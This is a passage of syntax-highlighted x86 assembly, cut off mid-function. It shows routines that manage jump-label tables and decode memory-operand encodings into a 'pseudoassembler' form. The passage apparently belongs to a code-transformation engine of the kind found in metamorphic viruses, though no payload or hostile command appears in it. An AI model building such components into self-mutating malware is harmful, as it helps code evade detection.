                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;  referenced destiny address.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabelsPost</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">; Increase the number</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabelsPost</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; of labels.</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; Return 0</span><span class="sc0">
      </span><span class="sc5">@@Jcc_CodeDefined</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">SetInFutureLabelList</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function InsertLabel</span><span class="sc0">
</span><span class="sc1">;; Simply inserts the address passed into the definitive label list.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Params:</span><span class="sc0">
</span><span class="sc1">;; EAX = Destination address of jump (or call, etc.)</span><span class="sc0">
</span><span class="sc1">;; EBX = Instruction in list (dissasembled) where EAX points to</span><span class="sc0">
</span><span class="sc1">;; Returns:</span><span class="sc0">
</span><span class="sc1">;;     ECX undefined</span><span class="sc0">
</span><span class="sc1">;;     EDX = Address in the list where the label has been stored (formerly</span><span class="sc0">
</span><span class="sc1">;;           the type of label we'll use in the instructions).</span><span class="sc0">
</span><span class="sc5">InsertLabel</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LabelTable</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">               </span><span class="sc1">; Check if there's any</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Jcc_InsertaEtiqueta</span><span class="sc0">    </span><span class="sc1">; If not, insert at first pos.</span><span class="sc0">
      </span><span class="sc5">@@Jcc_LoopEtiqueta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Check if it exists already</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Jcc_EtiquetaYaPuesta</span><span class="sc0">  </span><span class="sc1">; If it exists, return the ptr</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">; Check next</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Jcc_LoopEtiqueta</span><span class="sc0">
      </span><span class="sc5">@@Jcc_InsertaEtiqueta</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">; We didn't find the address, so let's</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; insert the new label and return the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; pointer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set the label mark in the instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0"> </span><span class="sc1">; we are referencing</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Increase the counter of</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; labels stored in the table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Return the label pointer address</span><span class="sc0">
      </span><span class="sc5">@@Jcc_EtiquetaYaPuesta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InsertLabel</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function scans the "future labels table" and looks if every entry in</span><span class="sc0">
</span><span class="sc1">;; the table is pointing to the current EIP. If it is, it inserts a label in</span><span class="sc0">
</span><span class="sc1">;; the "definitive label table", completes the referenced instruction and</span><span class="sc0">
</span><span class="sc1">;; continues the check until all the temporary labels that points to that code</span><span class="sc0">
</span><span class="sc1">;; are released.</span><span class="sc0">
</span><span class="sc5">ReleaseFutureLabels</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabelsPost</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check the number</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SigueInstr</span><span class="sc0">                    </span><span class="sc1">; If it's 0, return</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FutureLabelTable</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">@@LoopCheckFutureLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Check if the current EIP is in the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FutureLabelFound</span><span class="sc0">  </span><span class="sc1">; table. If it is, release it.</span><span class="sc0">
      </span><span class="sc5">@@OtraEtiquetaFutura</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; Get the next</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">      </span><span class="sc1">; If there are more, loop</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCheckFutureLabel</span><span class="sc0">
      </span><span class="sc5">@@SigueInstr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
      </span><span class="sc5">@@FutureLabelFound</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; Insert a label into the current EIP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InsertLabel</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; Returns EDX = label entry</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the address of the instruction to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; complete and complete it.</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; Eliminate the buffered label</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@OtraEtiquetaFutura</span><span class="sc0"> </span><span class="sc1">; Jump to get another</span><span class="sc0">
</span><span class="sc5">ReleaseFutureLabels</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function decodes a memory reference in an opcode which is pointed by</span><span class="sc0">
</span><span class="sc1">;; EDX. Since the struct we use for memory codifications is common for all</span><span class="sc0">
</span><span class="sc1">;; the instructions of the pseudoassembler, the decodification of the memory</span><span class="sc0">
</span><span class="sc1">;; reference opcodes and fields are equal for all them.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; EDX = Address to get opcodes from.</span><span class="sc0">
</span><span class="sc1">;; We must ensure that it's a memory construction.</span><span class="sc0">
</span><span class="sc1">;; Returns EBX = Length of the memory reference opcodes (opcodes and addition)</span><span class="sc0">
</span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000808h</span><span class="sc0"> </span><span class="sc1">; Initialize the memory structure</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; Set a length of 1 (at least this</span><span class="sc0">
                                       </span><span class="sc1">; opcode)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">         </span><span class="sc1">; Special opcode?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ThirdOpcodeUsed</span><span class="sc0"> </span><span class="sc1">; If so, a third opcode is used</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">         </span><span class="sc1">; Direct memory address?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectMemory</span><span class="sc0">   </span><span class="sc1">; Jump, then</span><span class="sc0">

      </span><span class="sc5">@@SetBaseRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the base index</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the type of addition:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; No addition?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoAddition</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">       </span><span class="sc1">; Byte (with sign extension)?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ByteAddition</span><span class="sc0">
      </span><span class="sc5">@@DwordAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; Set dword addition (length of 4)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the addition and set it in the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetAddition</span><span class="sc0">    </span><span class="sc1">;  pseudoassembler instruction</span><span class="sc0">
      </span><span class="sc5">@@ByteAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; Set a byte addition (length of 1)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the addition</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; Extend the sign</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SetAddition</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
      </span><span class="sc5">@@SetAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set the addition value in the instr.</span><span class="sc0">
      </span><span class="sc5">@@NoAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                    </span><span class="sc1">; Return</span><span class="sc0">

      </span><span class="sc5">@@DirectMemory</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get the DWORD of the address</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Check if it's EBP</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@SetBaseRegister</span><span class="sc0"> </span><span class="sc1">; If it's EBP, jump to decode it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DwordAddition</span><span class="sc0">   </span><span class="sc1">; If not, set the addition as a direct</span><span class="sc0">
                                        </span><span class="sc1">; memory address</span><span class="sc0">

      </span><span class="sc1">;; Here if we use a third opcode</span><span class="sc0">
      </span><span class="sc5">@@ThirdOpcodeUsed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Add one more byte to the length</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the third opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">        </span><span class="sc1">; Check the middle index</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; If it's ESP then we use only one</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@IgnoreScalarRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Get the multiplicator (or scalar)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; from the bits 7&amp;6 of the third</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; opcode, and after that set the</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; register into the pseudoassembler</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@@IgnoreScalarRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the second opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; Are we adding something?</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; If we don't, EBP in the low bits of</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EBPMeansDwordAddition</span><span class="sc0"> </span><span class="sc1">; the third opcode means DWORD</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">; addition</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">          </span><span class="sc1">; Get the low index at 3rd</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set the index at first position</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0"> </span><span class="sc1">; in the memory struct</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the addition from the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@ByteAddition2</span><span class="sc0">   </span><span class="sc1">; Byte addition (sign extended)?</span><span class="sc0">
      </span><span class="sc5">@@DwordAddition2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; Add the DWORD addition length, get </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; the addition DWORD and jump.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SetAddition2</span><span class="sc0">
      </span><span class="sc5">@@ByteAddition2</span><span class="sc4">:</span><span class="sc0">
